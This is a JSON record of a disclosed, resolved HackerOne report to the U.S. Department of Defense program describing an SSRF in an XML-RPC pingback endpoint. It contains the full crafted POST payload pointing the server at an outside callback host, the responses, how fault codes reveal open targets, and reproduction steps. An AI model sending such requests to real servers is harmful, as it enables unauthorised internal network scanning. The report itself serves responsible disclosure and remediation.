@@ -1,0 +1,115 @@
+{
+  "id": 406387,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDYzODc=",
+  "url": "https://hackerone.com/reports/406387",
+  "title": "SSRF on ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-06T08:42:39.560Z",
+  "submitted_at": "2018-09-06T08:42:39.560Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "twicedi",
+    "url": "/twicedi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-08T18:45:21.526Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-14T08:40:15.571Z",
+  "team_member_agreed_on_going_public_at": "2019-10-08T18:45:21.421Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThe web application hosted on the \"███████\" domain is affected by a Server Side Request Forgery (SSRF) vulnerability that could allows an attacker to force the application to make requests to arbitrary targets.\n\n**Description:**\nThe affected handler is the \"/xmlrpc/pingback/\".\nThis handler receives an xml payload containing an arbitrary URL. This parameter is then used by the application to send a request to the target.\n\nThe following request contains a valid target (for test purpose I have temporary generated the following domain: http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/ with the Burp Collaborator tool):\n\n```\nPOST /xmlrpc/pingback/ HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nCookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 305\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value>http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/</value>\n</param>\n<param>\n<value>https://████/web/guest/home/</value>\n</param>\n</params>\n</methodCall>\n```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/xml;charset=UTF-8\nServer: Microsoft-IIS/8.5\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1\nX-Powered-By: ASP.NET\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nContent-Length: 291\nDate: Thu, 06 Sep 2018 07:34:54 GMT\nConnection: close\nSet-Cookie: JSESSIONID=3D2874915F19DB1CE69EBAE34C6F894C; Path=/; Secure; HttpOnly\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodResponse><fault><value><struct><member><name>faultCode</name><value><i4>17</i4></value></member><member><name>faultString</name><value><string>Could not find target URI in source</string></value></member></struct></value></fault></methodResponse>\n```\n\nIf the response contains a \"faultCode\" with a value of 17 (<value><int>17</int></value>) then it means the port is open. In the following screenshot it is showed the log of the dns request sent by the DoD server.\n\n██████\n\nInstead by using a non-existent domain as target (http://non.existent/):\n\n```\nPOST /xmlrpc/pingback/ HTTP/1.1\nHost: ████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nCookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 266\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value>http://non.existent/</value>\n</param>\n<param>\n<value>https://████████/web/guest/home/</value>\n</param>\n</params>\n</methodCall>\n```\n\nThe response contains a different \"faultCode\" with a different \"faultString\":\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/xml;charset=UTF-8\nServer: Microsoft-IIS/8.5\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1\nX-Powered-By: ASP.NET\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nContent-Length: 282\nDate: Thu, 06 Sep 2018 07:36:53 GMT\nConnection: close\nSet-Cookie: JSESSIONID=42FE4B60C1214FF84F72CFDD9E287A6C; Path=/; Secure; HttpOnly\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodResponse><fault><value><struct><member><name>faultCode</name><value><i4>16</i4></value></member><member><name>faultString</name><value><string>Error accessing source URI</string></value></member></struct></value></fault></methodResponse>\n```\n\nBy exploiting this SSRF an attacker may be able to scan the local or external networks to which the vulnerable server is connected to. \n\n\n## Impact\nThe impact of exploiting a Server Side Request Forgery vulnerability mainly depends on how the web application uses the responses from the remote resource, such as:\n- scan ports and IP addresses\n- interact with some protocols such as Gopher\n- discover the IP addresses of servers running behind a reverse proxy\n- Denial of Services\n- In some situation potentially remote code execution\n\n\n## Step-by-step Reproduction Instructions\n\n1. To exploit this issue an attacker has to craft a POST request, similar to the following, that contains the target URL:\n\n```\nPOST /xmlrpc/pingback/ HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nCookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 305\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value>http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/</value>\n</param>\n<param>\n<value>https://█████/web/guest/home/</value>\n</param>\n</params>\n</methodCall>\n```\n\n\n## Suggested Mitigation/Remediation Actions\nTo prevent SSRF vulnerabilities in your web applications it is strongly advised to use a whitelist of allowed domains and protocols from where the web server can fetch remote resources.\nIf possible avoid using user input directly in functions that can make requests on behalf of the server. \n\nI'm available for further clarification,\n\nBest,\nDavide\n\n## Impact\n\nThe impact of exploiting a Server Side Request Forgery vulnerability mainly depends on how the web application uses the responses from the remote resource, such as:\n- scan ports and IP addresses\n- interact with some protocols such as Gopher\n- discover the IP addresses of servers running behind a reverse proxy\n- Denial of Services\n- In some situation potentially remote code execution",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "mashoud1122",
+    "0nlymohammed",
+    "lumbridge",
+    "f0rhacksd",
+    "cryptographer",
+    "darrkmagician_",
+    "cyber112",
+    "destinedtohack"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
